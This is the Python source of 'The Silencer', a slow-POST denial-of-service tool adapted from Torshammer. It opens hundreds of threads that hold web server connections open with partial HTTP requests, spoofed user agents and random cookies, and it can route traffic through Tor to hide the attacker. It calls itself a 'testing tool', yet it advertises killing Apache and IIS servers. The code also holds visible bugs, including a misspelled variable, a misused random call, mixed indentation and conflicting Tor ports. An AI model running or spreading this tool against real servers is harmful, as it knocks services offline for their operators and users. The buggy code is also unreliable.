#!/usr/bin/python

"""
The Silencer: https://github.com/haigiang02/the-silencer
Based on : https://sourceforge.net/projects/torshammer

The Silencer is a slow post dos testing tool written in Python.
It can also be run through the Tor network to be anonymized.
If you are going to run it with Tor it assumes you are running Tor on 127.0.0.1:9050. 
Kills most unprotected web servers running Apache and IIS via a single instance.
Kills Apache 1.X and older IIS with ~128 threads.
Kills newer IIS and Apache 2.X with ~256 threads.

Modded by haigiang02 from zunzutech.com
"""

import os
import re
import time
import sys
import random
import math
import getopt
import socks
import string
import terminal

from threading import Thread

global stop_now
global term

stop_now = False
term = terminal.TerminalController()

useragents = [
 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
 "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
 "Googlebot/2.1 (http://www.googlebot.com/bot.html)",
 "Opera/9.20 (Windows NT 6.0; U; en)",
 "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)",
 "Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0",
 "Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16",
 "Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)", # maybe not
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13",
 "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
 "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
 "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
 "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36",
 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
 "Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)",
 "AbachoBOT (Mozilla compatible)",
 "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)",
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8",
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36",
 "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
 "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20130401 Firefox/31.0",
 "Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0",
 "DoCoMo/1.0/P502i/c10 (Google CHTML Proxy/1.0)",
 "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
 "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
 "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
 "Mozilla/5.0 (Microsoft Windows NT 6.2.9200.0); rv:22.0) Gecko/20130405 Firefox/22.0",
 "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.517 Safari/537.36",
 "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)"
]
referers = [
	"https://www.google.com/search?q=",
	"https://www.google.co.uk/search?q=",
	"https://www.google.cn/search?q=",
	"https://www.google.com.hk/search?q=",
	"https://www.google.co.ph/search?q=",
]

def buildblock(size):
	out_str=''
	_LOWERCASE = range(97, 122)
	_UPPERCASE = range(65, 90)
	_NUMERIC = range(48, 57)
	validChars = _LOWECASE + _UPPERCASE + _NUMERIC
	for i in range(0, size):
		a = random.choice(validChars)
		out_str += chr(a)
	return(out_str)
def querystring(ammount=1):
	queryString = []
	for i in range(ammount):
		key = buildblock(random.randint(3,10))
		value = buildblock(random.randint(3,20))
		element = "{0}={1}".format(key, value)
		queryString.append(element)
	return '&'.join(queryString)
class httpPost(Thread):
    def __init__(self, host, port, tor):
        Thread.__init__(self)
        self.host = host
        self.port = port
        self.socks = socks.socksocket()
        self.tor = tor
        self.running = True
		
    def _send_http_post(self, pause=random.randint(5,10)): 
        global stop_now

        self.socks.send("POST / HTTP/1.1\r\n"
                        "Host: %s\r\n"
                        "User-Agent: %s\r\n"
                        "Connection: keep-alive\r\n"
                        "Referer: %s\r\n"
                        "Cookie: %s\r\n"
                        "Keep-Alive: %s\r\n" 
                        "Content-Length: 99768\r\n"
                        "Content-Type: application/x-www-form-urlencoded\r\n\r\n" % 
                        (self.host, random.randint(useragents), random.randint(300, 894), random.choice(referers) + buildblock(random.randint(5,10)), querystring(random.randint(1, 5))))
    def _send_http_get(self, pause=random.randint(5,10)):
	global stop_now

	self.socks.send("GET / HTTP/1.1\r\n"
			"Host: %s\r\n"
			"User-Agent: %s\r\n"
			"Connection: keep-alive\r\n"
			"Keep-Alive: %s\r\n"
			"Accept-Encoding: gzip\r\n"
			"Accept-Language: en\r\n"
			"Referer: %s\r\n"
			"Cookie: %s\r\n" %
			(self.host, random.choice(useragents), random.randint(300,894), random.choice(referers) + buildblock(random.randint(5,10)), querystring(random.randint(1, 5))))
        for i in range(0, 9999):
            if stop_now:
                self.running = False
                break
            p = random.choice(string.letters+string.digits)
            print term.BOL+term.UP+term.CLEAR_EOL+"Posting: %s" % p+term.NORMAL
            self.socks.send(p)
            time.sleep(random.uniform(0.1, 3))
	
        self.socks.close()
		
    def run(self):
        while self.running:
            while self.running:
                try:
                    if self.tor:     
						self.socks.setproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9150)
                    self.socks.connect((self.host, self.port))
                    print term.BOL+term.UP+term.CLEAR_EOL+"Connected to host..."+ term.NORMAL
                    break
                except Exception, e:
                    if e.args[0] == 106 or e.args[0] == 60:
                        break
                    print term.BOL+term.UP+term.CLEAR_EOL+"Error connecting to host..."+ term.NORMAL
                    time.sleep(1)
                    continue
	
            while self.running:
                try:
                    random.choice([self._send_http_post(), self._send_http_get()])
                except Exception, e:
                    if e.args[0] == 32 or e.args[0] == 104:
                        print term.BOL+term.UP+term.CLEAR_EOL+"Thread broken, restarting..."+ term.NORMAL
                        self.socks = socks.socksocket()
                        break
                    time.sleep(0.1)
                    pass
 
def usage():
    print "./thesilencer.py -t <target> [-r <threads> -p <port> -T -h]"
    print " -t|--target <Hostname|IP>"
    print " -r|--threads <Number of threads> Defaults to 256"
    print " -p|--port <Web Server Port> Defaults to 80"
    print " -T|--tor Enable anonymising through tor on 127.0.0.1:9150, but will slow down the attack. Remember to install and set up Tor before doing this!"
    print " -h|--help Shows this help\n" 
    print "Eg. ./thesilencer.py -t 192.168.1.100 -r 256\n"

def main(argv):
    
    try:
        opts, args = getopt.getopt(argv, "hTt:r:p:", ["help", "tor", "target=", "threads=", "port="])
    except getopt.GetoptError:
        usage() 
        sys.exit(-1)

    global stop_now
	
    target = ''
    threads = 1024
    tor = False
    port = 80

    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
            sys.exit(0)
        if o in ("-T", "--tor"):
            tor = True
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-r", "--threads"):
            threads = int(a)
        elif o in ("-p", "--port"):
            port = int(a)

    if target == '' or int(threads) <= 0:
        usage()
        sys.exit(-1)

    print term.DOWN + term.RED + "/*" + term.NORMAL
    print term.RED + " * Target: %s Port: %d" % (target, port) + term.NORMAL
    print term.RED + " * Threads: %d Tor: %s" % (threads, tor) + term.NORMAL
    print term.RED + " * Give 20 seconds without tor or 40 with before checking site" + term.NORMAL
    print term.RED + " */" + term.DOWN + term.DOWN + term.NORMAL

    rthreads = []
    for i in range(threads):
        t = httpPost(target, port, tor)
        rthreads.append(t)
        t.start()

    while len(rthreads) > 0:
        try:
            rthreads = [t.join(1) for t in rthreads if t is not None and t.isAlive()]
        except KeyboardInterrupt:
            print "\nShutting down threads...\n"
            for t in rthreads:
                stop_now = True
                t.running = False

if __name__ == "__main__":
    print "\n/*"
    print " *"+term.RED + " The Silencer"+term.NORMAL
    print " * Slow POST DoS Testing Tool"
    print " * Based on Torshammer, modded by haigiang02 from zunzutech.com"
    print " * Anon-ymized via Tor"
    print " * Only those with enough power and wit survives"
    print " */\n"

    main(sys.argv[1:])

